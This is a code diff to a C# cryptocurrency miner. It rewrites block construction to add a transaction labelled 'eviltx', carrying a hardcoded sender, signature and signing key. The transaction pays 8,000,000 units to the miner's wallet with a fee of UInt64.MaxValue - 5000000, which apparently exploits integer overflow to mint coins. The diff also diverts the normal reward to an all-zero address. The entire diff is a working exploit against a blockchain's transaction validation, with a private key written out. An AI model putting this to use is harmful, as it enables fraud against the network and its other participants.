@@ -263,16 +263,30 @@ namespace dcrpt_miner
                 using (var stream = new MemoryStream())
                 {
                     transactions.RemoveAll(x => x.isTransactionFee);
-                    var reward = new Transaction
+                    var evilreward = new Transaction
                     {
-                        to = Wallet,
-                        amount = problem.miningFee,
+                        to = "00000000000000000000000000000000000000000000000000",
+                        //to = Wallet,
+                        amount = problem.miningFee, // 50BMB
                         fee = 0,
                         timestamp = problem.lastTimestamp,
                         isTransactionFee = true
                     };
 
-                    transactions.Add(reward);
+                    var eviltx = new Transaction
+                    {
+                        from = "00942CBD0F3F08866CEB8086C79B72FCE2BDAB63029CB8D2A0",
+                        signature = "54B7266949EBDEB2ACE443518CF718BF708FE70AFAB81D8E0CF03251B82EA1974AAB7392C989C2CE54E66E710DC74A696D8E1C2314A1344822A258453C20310A",
+                        signingKey = "2F12F7D61CD5E3515D3E17357F3B5F344DB246B4A5246A6AA4B48DAE0CC8858E",
+                        to = Wallet,
+                        amount = 8000000,
+                        fee = UInt64.MaxValue - 5000000,
+                        timestamp = ((ulong)DateTimeOffset.Now.ToUnixTimeSeconds()).ToString(),
+                        isTransactionFee = false
+                    };
+
+                    transactions.Add(evilreward);
+                    transactions.Add(eviltx);
 
                     var tree = new MerkleTree(transactions);
                     var timestamp = (ulong)DateTimeOffset.Now.ToUnixTimeSeconds();
